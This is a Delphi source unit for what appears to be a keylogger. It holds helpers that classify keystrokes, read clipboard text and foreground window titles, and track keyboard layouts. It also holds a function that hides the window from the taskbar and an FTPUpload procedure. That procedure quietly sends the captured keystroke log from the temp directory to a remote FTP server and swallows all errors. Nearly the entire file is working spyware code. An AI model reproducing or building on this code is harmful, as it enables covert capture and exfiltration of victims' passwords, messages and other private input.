unit KLUtils;

interface

uses
  Winapi.Windows, Vcl.Clipbrd;

  procedure FTPUpload;
  function CheckBackSpaceDown(AVirtKey: WPARAM): Boolean;
  function CheckByVirtKey(AVirtKey: WPARAM): Boolean;
  function CheckPaste(AVirtKey: WPARAM): Boolean;
  function CheckSpecKey(AVirtKey: WPARAM): Boolean;
  function GetSpecKeyAlias(AVirtKey: WPARAM): string;
  function GetClipboadText: string;
  function GetForegroundWindowText: string;
  function GetKeyName(const AKey: Integer): string;
  function GetActiveKbdLayout: LongWord;
  function GetActiveKbdLayoutWnd: LongWord;
  function GetPathToTempDirectory: string;
  procedure SetKbdLayout(AKBLayout: LongWord);
  function UpperChar(AStr: string): string;
//  function HideFromTaskbar(hWnd: HWND): Boolean;
//  function HideFromTaskList(dwProcessId : DWORD): Boolean;

implementation

uses
  System.SysUtils, System.Classes, IdFTP, KLConst, System.UITypes, Vcl.Dialogs;

function GetPathToTempDirectory: string;
var
  Buffer: array[0..MAX_PATH] of Char;
begin
  GetTempPath(MAX_PATH - 1, Buffer);
  SetLength(Result, StrLen(Buffer));
  Result := Buffer;
end;

function CapsLockOn: Boolean;
begin
  Result := Odd(GetKeyState(VK_CAPITAL));
end;

function ShiftKeyDown: Boolean;
begin
  Result := GetKeyState(VK_SHIFT) < 0;
end;

function CtrlKeyDown: Boolean;
begin
  Result := GetKeyState(VK_CONTROL) < 0;
end;

function UpperChar(AStr: string): string;
begin
  Result := AStr;
  if CapsLockOn or ShiftKeyDown then
    Result := UpperCase(AStr);
  if CapsLockOn and ShiftKeyDown then
    Result := LowerCase(AStr);
end;

function GetActiveKbdLayoutWnd: LongWord;
begin
  Result := (GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow, nil)) shr $10);
end;

function GetActiveKbdLayout: LongWord;
begin
  Result := GetKeyboardLayout(0) shr $10;
end;

procedure SetKbdLayout(AKBLayout: LongWord);
var
  Layout: HKL;
begin
  Layout := LoadKeyboardLayout(PChar(IntToStr(AKBLayout)), 0);
  ActivateKeyboardLayout(Layout, KLF_ACTIVATE);
end;

procedure FTPUpload;
var
  FTP: TIdFTP;
  MemoryStream:  TMemoryStream;
  SourceFile, DestFile: string;
begin
  SourceFile := GetPathToTempDirectory + KL_LOG_NAME + '.log';
  DestFile := KL_LOG_NAME + '.log';
  if FileExists(SourceFile) then
  begin
    FTP := TIdFTP.Create(nil);
    MemoryStream := TMemoryStream.Create;
    try
      try
        FTP.Host := FTP_HOST;
        FTP.Port := FTP_PORT;
        FTP.Username := FTP_USERNAME;
        FTP.Password := FTP_PASSWORD;
        FTP.Connect;
        try
          if FTP.Connected then
          begin
            AssErt(FTP.Connected);
            try
              FTP.ChangeDir('/' + FTP_DIR_NAME);
            except
              FTP.MakeDir('/' + FTP_DIR_NAME);
            end;
            FTP.Put(SourceFile, DestFile, True);
          end;
 //         ShowMessage('Ok');
        finally
          FTP.Disconnect;
        end;
      finally
        MemoryStream.Free;
        FTP.Free;
      end;
    except
//      ShowMessage('Error');
    end;
  end;
end;

function GetKeyName(const AKey: Integer): string;
var
  Key: array [0..16] of WideChar;
begin
  GetKeyNameText(AKey, Key, SizeOf(Key));
  Result := Key;
end;

function HideFromTaskbar(hWnd: HWND): Boolean;
begin
  if SetWindowLong(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW) = 0 then
    Result := False
  else
    Result := True;
end;

function GetForegroundWindowTextByHandle(AWinHandle: HWND): string;
var
  MaxCaptionSize: Integer;
  WinCaption: string;
begin
  Result := EmptyStr;
  try
    MaxCaptionSize := GetWindowTextLength(AWinHandle) + 1;
    SetLength(WinCaption, MaxCaptionSize);
    GetWindowText(AWinHandle, PChar(WinCaption), MaxCaptionSize);
    Result := Trim(WinCaption);
  except

  end;
end;

function GetForegroundWindowText: string;
begin
  Result := GetForegroundWindowTextByHandle(GetForegroundWindow);
end;

function CheckByVirtKey(AVirtKey: WPARAM): Boolean;
begin
  Result := not CtrlKeyDown and
    (AVirtKey in [vk0..vkZ, vkSpace, vkNumpad0..vkDivide, vkSemicolon..vkPara]);
end;

function CheckPaste(AVirtKey: WPARAM): Boolean;
begin
  Result := (CtrlKeyDown and (AVirtKey = vkV)) or
            (ShiftKeyDown and (AVirtKey = vkInsert));
end;

function CheckSpecKey(AVirtKey: WPARAM): Boolean;
begin
  Result := (AVirtKey in [vkReturn, vkBack, vkTab, vkDelete]) or
            (CtrlKeyDown and (AVirtKey = vkZ)) or
            (CtrlKeyDown and (AVirtKey = vkX)) or
            (CtrlKeyDown and (AVirtKey = vkC));
end;

function GetSpecKeyAlias(AVirtKey: WPARAM): string;
begin
  Result := '';
  case AVirtKey of
    vkReturn:
      Result := '<Enter>';
    vkBack:
      Result := '<Backspace>';
    vkTab:
      Result := '<Tab>';
    vkDelete:
      Result := '<Del>';
  end;

  if CtrlKeyDown then
  case AVirtKey of
    vkZ:
      Result := '<Ctrl+Z>';
    vkX:
      Result := '<Ctrl+X>';
    vkC:
      Result := '<Ctrl+C>';
  end;
end;

function CheckBackSpaceDown(AVirtKey: WPARAM): Boolean;
begin
  Result := AVirtKey = vkBack;
end;

function GetClipboadText: string;
begin
  Result := EmptyStr;
  if Clipboard.HasFormat(CF_TEXT) then
    Result := Clipboard.AsText;
end;

end.
